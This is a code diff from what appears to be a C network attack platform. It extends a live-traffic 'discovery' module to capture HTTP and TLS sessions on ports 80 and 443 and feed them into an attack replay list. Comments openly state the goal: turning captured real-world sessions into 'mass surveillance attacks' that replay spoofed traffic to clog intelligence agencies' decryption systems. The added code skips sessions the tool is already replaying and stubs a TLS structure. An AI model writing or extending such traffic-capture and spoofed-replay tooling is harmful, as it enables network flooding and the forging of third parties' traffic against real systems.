@@ -604,18 +604,19 @@ int ResearchPyDiscoveredHTTPSession(AS_context *ctx, char *IP_src, int *source_p
 
 
 // Initializes the HTTP Discovery subsystem, and implements the network filter, and hook for ensuring we receive WWW packets
-int HTTPDiscover_Init(AS_context *ctx) {
+int WebDiscover_Init(AS_context *ctx) {
     FilterInformation *flt = NULL;
     int ret = 0;
 
-    // allocate space for our incoming packet filter
-    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;
-
     // create a filter for port 80
+    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;
     FilterPrepare(flt, FILTER_PACKET_TCP|FILTER_SERVER_PORT|FILTER_PACKET_FAMILIAR, 80);
+    if (Network_AddHook(ctx, flt, &WebDiscover_Incoming) != 1) goto end;
 
-    // append it into the network hooking subsystem
-    if (Network_AddHook(ctx, flt, &HTTPDiscover_Incoming) != 1) goto end;
+    // create a filter for port 443 (ssl to attack NSA decryption programs)
+    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;
+    FilterPrepare(flt, FILTER_PACKET_TCP|FILTER_SERVER_PORT|FILTER_PACKET_FAMILIAR, 443);
+    if (Network_AddHook(ctx, flt, &WebDiscover_Incoming) != 1) goto end;
 
     // now we will begin getting raw http sessions to automate into mass surveillancce attacks :)
 
@@ -624,16 +625,15 @@ int HTTPDiscover_Init(AS_context *ctx) {
 
 }
 
-static int pcount = 0;
-
 // Look for new connections via SYN packets, and completed ones via FIN/RST packets.
 // Once both are found then it is considered a complete single HTTP session, and can be used as an attack itself.
 // It will allow constant real world traffic being integrated directly into the attack platform.
-int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
+int WebDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
     int ret = -1;
     HTTPBuffer *hptr = ctx->http_buffer_list;
     char fname[32];
     PacketBuildInstructions *packet_copy = NULL;
+    AS_attacks *aptr = ctx->attack_list;
     //sprintf(fname, "packets/data_%d.dat", pcount);
     //FileWrite(fname, iptr->data, iptr->data_size);
 
@@ -644,7 +644,7 @@ int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
 
     // if its not enabled.. just exit
     if (!ctx->http_discovery_enabled) return 0;
-    
+
     while (hptr != NULL) {
         // find connecction by source ports...
         // if it matches another (unlikely) fuck it. who cares. it wont get far.
@@ -659,6 +659,20 @@ int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
     if (hptr == NULL) {
         // look for SYN packet (start of connection)
         if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
+
+            if (ctx->http_discovery_skip_ours) {
+                // first we need to verify that this isnt some connection that we are currently replaying (an attack)
+                // i might have to change interval from one second to 5 here.. but with enough attacks it shouldnt matter
+                while (aptr != NULL) {
+                    if (!(((aptr->destination_port == iptr->destination_port) || (aptr->destination_port == iptr->source_port)) &&
+                        ((aptr->source_port == iptr->source_port) || (aptr->source_port == iptr->destination_port)))) {
+                            // check if these ports are currently being used by our software...
+                            goto end;
+                        }
+                    aptr = aptr->next;
+                }
+            }
+
             // it is a SYN packet.. start of a connection.. we need to begin to monitor
             if ((hptr = (HTTPBuffer *)calloc(1, sizeof(HTTPBuffer))) == NULL) goto end;
             
@@ -804,7 +818,7 @@ HTTPObservedVariables *ObserveAdd(AS_context *ctx, int ttl, int window_size) {
 // so that later this same  function can incorporate a new one
 // this means itll always obtain new user agents, new sites,  etc...
 // will require 0 upkeep
-int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
+int WebDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
     int ret = 0, i = 0;
     char *server_body = NULL;
     int server_body_size = 0;
@@ -879,8 +893,8 @@ int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
     new_source_ip = source_ip;
     new_destination_ip = destination_ip;
 
-    //i = 1;
-    i  = ResearchPyDiscoveredHTTPSession(ctx, &new_source_ip, &new_source_port, &new_destination_ip, &new_dest_port, &source_country, &destination_country, &client_body, &client_body_size, &server_body, &server_body_size);
+    i = 1;
+    //i  = ResearchPyDiscoveredHTTPSession(ctx, &new_source_ip, &new_source_port, &new_destination_ip, &new_dest_port, &source_country, &destination_country, &client_body, &client_body_size, &server_body, &server_body_size);
     //printf("i: %d\n", i);
 
     if (i == 0) goto end;
@@ -1043,12 +1057,23 @@ int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
 }
 
 
+/*
+
+ssl connections are going to clog up all NSA decryption routines
+we just keep replaying them.. they may have even more pwer in destroying their networks than plaintext at this  point
+due to most sites being SSL
+
+
+later we can separate SSL and non SSL
+
+*/
+
 
 
 
 // perform function (regular looop)..
 // this needs to check if any of our internal buffers have a full HTTP session, timed out, or used too much  buffer and needs to be discarded
-int HTTPDiscover_Perform(AS_context *ctx) {
+int WebDiscover_Perform(AS_context *ctx) {
     int ret = 0;
     HTTPBuffer *hptr = ctx->http_buffer_list;
     int ts = time(0);
@@ -1056,8 +1081,12 @@ int HTTPDiscover_Perform(AS_context *ctx) {
     // loop and analyze any completed sessions we found in live traffic
     while (hptr != NULL) {
         if (!hptr->processed && hptr->complete) {
-            if (L_count((LINK *)ctx->attack_list) < ctx->http_discovery_max)
-                ret += HTTPDiscover_AnalyzeSession(ctx, hptr);
+            if (L_count((LINK *)ctx->attack_list) < ctx->http_discovery_max) {
+
+                // we will process port 80 (http) OR ssl (443)
+                if ((hptr->destination_port == 80) || (hptr->destination_port == 443))
+                    ret += WebDiscover_AnalyzeSession(ctx, hptr);
+            }
         }
 
         if (!hptr->complete) {
@@ -1066,17 +1095,15 @@ int HTTPDiscover_Perform(AS_context *ctx) {
                 // mark for deletion
                 hptr->processed=1;
             }
-
         }
 
         // we give a maximum of this timmeout  (currently 10 seconds) for a complete http session to buffer
         if ((ts - hptr->ts) > HTTP_DISCOVER_TIMEOUT) hptr->processed = 1;
 
         hptr = hptr->next;
-
     }
 
-    ret += HTTPDiscover_Cleanup(ctx);
+    ret += WebDiscover_Cleanup(ctx);
 
     end:;
     return ret;
@@ -1086,7 +1113,7 @@ int HTTPDiscover_Perform(AS_context *ctx) {
 
 
 // cleans up anything thats completely processed..
-int HTTPDiscover_Cleanup(AS_context *ctx) {
+int WebDiscover_Cleanup(AS_context *ctx) {
     int ret = 0;
     HTTPBuffer *hptr = ctx->http_buffer_list;
     HTTPBuffer *hlast = NULL, *hnext = NULL;
@@ -1162,3 +1189,19 @@ try to find a geo distance calculator to generate IPs furthest fromm the current
 
 
 */
+
+
+
+// now we wanna take TLS authentication connections, and peform the same actions..
+// the only difference is that the body, and other information are irrelevant...
+// itll be about sizes, etc
+// this will clog NSA decryption operations
+typedef struct _tls_information {
+    struct _tls_information *next;
+
+    int algorithm;
+    int key_size;
+
+
+
+} TLSInformation;
